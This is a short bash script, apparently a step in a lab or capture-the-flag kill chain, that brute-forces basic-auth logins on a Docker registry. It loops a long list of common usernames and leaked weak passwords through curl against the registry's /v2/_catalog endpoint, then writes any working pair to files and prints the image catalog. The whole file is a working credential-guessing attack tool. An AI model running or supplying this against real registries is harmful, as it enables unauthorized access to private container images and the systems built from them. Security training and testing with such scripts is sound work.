#!/usr/bin/env bash
set -eu

HOSTREGISTRY="${HOSTREGISTRY:-registry:5000}"

USER="${USER:-admin administrator user test guest info root sysadmin support service manager operator developer webmaster administrator1 \
admin1 user1 test1 guest1 root1 demo demo1 student teacher office mail ftp oracle mysql postgres nginx apache tomcat docker git github \
gitlab bitbucket jira confluence bamboo wordpress joomla drupal magento shop prestashop zabbix nagios cisco juniper mikrotik ubiquiti hp \
dell ibm lenovo microsoft windows linux ubuntu debian centos redhat fedora suse arch kali aws azure gcp cloud google facebook twitter instagram \
linkedin skype zoom slack discord telegram signal whatsapp outlook hotmail yahoo gmail protonmail icloud apple samsung huawei xiaomi sony nokia \
motorola pixel nokia1 devops ci cd build runner agent worker node server client api apiuser bot bot1 robot service1 service2 proxy proxy1 proxy2 \
vpn vpn1 vpn2 ssh sshd ftpuser sftpuser db dbadmin dbuser sql testuser}"

PASS="${PASS:-123456 123456789 qwerty password 111111 12345678 abc123 1234567 password1 12345 1234567890 123123 000000 iloveyou 1234 \
1q2w3e4r5t qwertyuiop 123 monkey dragon 123456a 654321 123321 666666 1qaz2wsx myspace1 121212 homelesspa 123qwe a123456 123abc 1q2w3e4r \
qwe123 7777777 qwerty123 target123 tinkle 987654321 qwerty1 222222 zxcvbnm 1g2w3e4r gwerty zag12wsx gwerty123 555555 fuckyou 112233 asdfghjkl \
1q2w3e 123123123 qazwsx computer princess 12345a ashley 159753 michael football sunshine 1234qwer iloveyou1 aaaaaa fuckyou1 789456123 daniel \
777777 princess1 123654 11111 asdfgh 999999 11111111 passer2009 888888 love abcd1234 shadow football1 love123 superman jordan23 jessica monkey1 \
12qwaszx a12345 baseball 123456789a killer asdf samsung master azerty charlie asd123 soccer fqrg7cs493 88888888 jordan testpassword}"

for user in $USER; do
  for pass in $PASS; do
    code=$(curl -sk -u "$user:$pass" -o /dev/null -w '%{http_code}' https://$HOSTREGISTRY/v2/_catalog)
    if [ "$code" -eq 200 ]; then
      echo "$pass" > $DATA_PATH/KC2/pass
      echo "$user" > $DATA_PATH/KC2/user
      echo "Credentials: $user - $pass"
      curl -ku "$user:$pass" https://$HOSTREGISTRY/v2/_catalog
    fi
  done
done

echo "SCRIPT FINISHED"